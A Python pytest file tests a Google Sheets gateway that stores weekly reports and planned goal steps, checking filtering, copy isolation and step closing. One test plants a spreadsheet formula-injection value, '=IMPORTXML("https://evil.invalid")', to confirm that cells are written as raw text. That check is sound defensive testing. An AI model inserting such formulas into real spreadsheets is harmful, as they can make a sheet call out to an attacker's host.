import pytest

from app.sheets.gateway import FakeSheetsGateway, GoogleSheetsGateway
from tests.test_sheets_live_helpers import FakeSheetsService, minimal_live_sheets


def test_find_weekly_report_filters_by_participant_and_week() -> None:
    gateway = FakeSheetsGateway(
        weekly_reports=[
            {"weekly_report_id": "WR001", "participant_id": "P001", "week_number": 1},
            {"weekly_report_id": "WR002", "participant_id": "P002", "week_number": 2},
            {"weekly_report_id": "WR003", "participant_id": "P001", "week_number": 3},
        ]
    )

    row = gateway.find_weekly_report("P001", week_number=3)

    assert row == {"weekly_report_id": "WR003", "participant_id": "P001", "week_number": 3}
    assert gateway.find_weekly_report("P001", week_number=2) is None

    assert row is not None
    row["weekly_report_id"] = "MUTATED"
    assert gateway.find_weekly_report("P001", week_number=3)["weekly_report_id"] == "WR003"


def test_append_weekly_report_step_stores_relation_copy() -> None:
    gateway = FakeSheetsGateway()
    relation = {
        "weekly_report_step_id": "WRS001",
        "weekly_report_id": "WR001",
        "participant_id": "P001",
        "goal_id": "G001",
        "step_id": "S001",
        "week_number": 2,
        "relation_status": "closed",
    }

    gateway.append_weekly_report_step(relation)
    relation["relation_status"] = "mutated"

    stored = gateway.list_weekly_report_steps()
    assert stored == [
        {
            "weekly_report_step_id": "WRS001",
            "weekly_report_id": "WR001",
            "participant_id": "P001",
            "goal_id": "G001",
            "step_id": "S001",
            "week_number": 2,
            "relation_status": "closed",
        }
    ]

    stored[0]["relation_status"] = "mutated again"
    assert gateway.list_weekly_report_steps()[0]["relation_status"] == "closed"


def test_close_planned_steps_updates_only_selected_owned_steps() -> None:
    gateway = FakeSheetsGateway(
        planned_steps=[
            _step("S001", "P001", "G001", "open"),
            _step("S002", "P001", "G001", "open"),
            _step("S003", "P001", "G001", "open"),
            _step("S004", "P001", "G002", "open"),
            _step("S005", "P002", "G001", "open"),
        ]
    )

    gateway.close_planned_steps(
        "P001",
        "G001",
        ["S001", "S003"],
        closed_week_number=2,
        closed_report_id="WR001",
        closed_at="2026-07-12T23:00:00+05:00",
    )

    steps = {row["step_id"]: row for row in gateway.list_planned_steps("P001", "G001")}
    assert steps["S001"]["step_status"] == "closed"
    assert steps["S001"]["closed_week_number"] == 2
    assert steps["S001"]["closed_report_id"] == "WR001"
    assert steps["S001"]["closed_at"] == "2026-07-12T23:00:00+05:00"
    assert steps["S002"]["step_status"] == "open"
    assert steps["S003"]["step_status"] == "closed"

    assert gateway.list_planned_steps("P001", "G002")[0]["step_status"] == "open"
    assert gateway.list_planned_steps("P002", "G001")[0]["step_status"] == "open"


def test_close_planned_steps_rejects_missing_or_foreign_steps_without_partial_update() -> None:
    gateway = FakeSheetsGateway(
        planned_steps=[
            _step("S001", "P001", "G001", "open"),
            _step("S002", "P002", "G001", "open"),
        ]
    )

    with pytest.raises(KeyError, match="S404"):
        gateway.close_planned_steps(
            "P001",
            "G001",
            ["S001", "S404"],
            closed_week_number=2,
            closed_report_id="WR001",
            closed_at="2026-07-12T23:00:00+05:00",
        )

    with pytest.raises(KeyError, match="S002"):
        gateway.close_planned_steps(
            "P001",
            "G001",
            ["S002"],
            closed_week_number=2,
            closed_report_id="WR001",
            closed_at="2026-07-12T23:00:00+05:00",
        )

    assert gateway.list_planned_steps("P001", "G001")[0]["step_status"] == "open"
    assert gateway.list_planned_steps("P002", "G001")[0]["step_status"] == "open"


def test_existing_gateway_behavior_is_preserved() -> None:
    gateway = FakeSheetsGateway()

    gateway.append_weekly_report({"weekly_report_id": "WR001", "participant_id": "P001"})
    gateway.append_insight({"insight_id": "I001", "participant_id": "P001"})

    assert gateway.list_weekly_reports() == [
        {"weekly_report_id": "WR001", "participant_id": "P001"}
    ]
    assert gateway.list_insights() == [{"insight_id": "I001", "participant_id": "P001"}]


def test_live_gateway_appends_weekly_report_and_steps() -> None:
    service = FakeSheetsService(minimal_live_sheets())
    gateway = GoogleSheetsGateway(service=service, spreadsheet_id="sheet-id")

    gateway.append_weekly_report(
        {
            "weekly_report_id": "WR001",
            "participant_id": "P001",
            "team_id": "T001",
            "goal_id": "G001",
            "week_number": 4,
            "status_symbol": "🟩",
            "status_code": "green",
            "score": 1,
            "report_text": "Done",
            "flow_source": "participant_bot",
        }
    )
    gateway.append_weekly_report_step(
        {
            "weekly_report_step_id": "WRS001",
            "weekly_report_id": "WR001",
            "participant_id": "P001",
            "step_id": "S001",
            "relation_status": "closed",
            "created_at": "2026-07-02T10:00:00+05:00",
        }
    )

    report = gateway.find_weekly_report("P001", week_number=4)
    assert report is not None
    assert report["weekly_report_id"] == "WR001"
    assert report["score"] == 1
    assert report["flow_source"] == "participant_bot"
    relation = gateway.list_weekly_report_steps()[0]
    assert relation["weekly_report_step_id"] == "WRS001"
    assert relation["relation_status"] == "closed"


def test_live_gateway_closes_planned_steps() -> None:
    service = FakeSheetsService(minimal_live_sheets())
    gateway = GoogleSheetsGateway(service=service, spreadsheet_id="sheet-id")

    gateway.close_planned_steps(
        "P001",
        "G001",
        ["S001"],
        closed_week_number=4,
        closed_report_id="WR001",
        closed_at="2026-07-02T10:00:00+05:00",
    )


def test_live_gateway_appends_eight_steps_once_with_raw_cells() -> None:
    sheets = minimal_live_sheets()
    sheets["PlannedSteps"] = [sheets["PlannedSteps"][0]]
    service = FakeSheetsService(sheets)
    gateway = GoogleSheetsGateway(service=service, spreadsheet_id="sheet-id")
    rows = [
        {
            "step_id": f"S:P001:G001:{number:02d}",
            "participant_id": "P001",
            "goal_id": "G001",
            "step_number": number,
            "step_title": f"Шаг {number}",
            "step_description": "=IMPORTXML(\"https://evil.invalid\")" if number == 1 else f"Суть {number}",
            "step_metric": f"Метрика {number}",
            "step_status": "open",
        }
        for number in range(1, 9)
    ]

    gateway.append_planned_steps(rows)
    gateway.append_planned_steps(rows)

    stored = gateway.list_planned_steps("P001", "G001")
    assert len(stored) == 8
    assert stored[0]["step_description"] == '=IMPORTXML("https://evil.invalid")'
    planned_appends = [row for sheet, row in service.appended if sheet == "PlannedSteps"]
    assert len(planned_appends) == 8
    assert ("append", "RAW") in service.value_input_options


def test_live_gateway_updates_metric_relation_and_partial_step_only() -> None:
    sheets = minimal_live_sheets()
    sheets["WeeklyReportSteps"].append([
        "WRS001", "WR001", "P001", "S001", "partial", "partial", "старый факт", "now"
    ])
    sheets["PlannedSteps"].append([
        "S002", "P001", "G001", 2, "Шаг 2", "Суть", "Метрика", "closed", "", "", ""
    ])
    service = FakeSheetsService(sheets)
    gateway = GoogleSheetsGateway(service=service, spreadsheet_id="sheet-id")

    gateway.update_weekly_report_step_metric("WR001", metric_result_text="новый факт")
    gateway.mark_planned_steps_partial("P001", "G001", ["S001", "S002"], updated_at="later")

    relation = gateway.list_weekly_report_steps()[0]
    steps = {row["step_id"]: row for row in gateway.list_planned_steps("P001", "G001")}
    assert relation["metric_result_text"] == "новый факт"
    assert steps["S001"]["step_status"] == "partial"
    assert steps["S002"]["step_status"] == "closed"
    assert all(option == "RAW" for _operation, option in service.value_input_options)


def _step(step_id: str, participant_id: str, goal_id: str, status: str) -> dict[str, object]:
    return {
        "step_id": step_id,
        "participant_id": participant_id,
        "goal_id": goal_id,
        "step_status": status,
    }
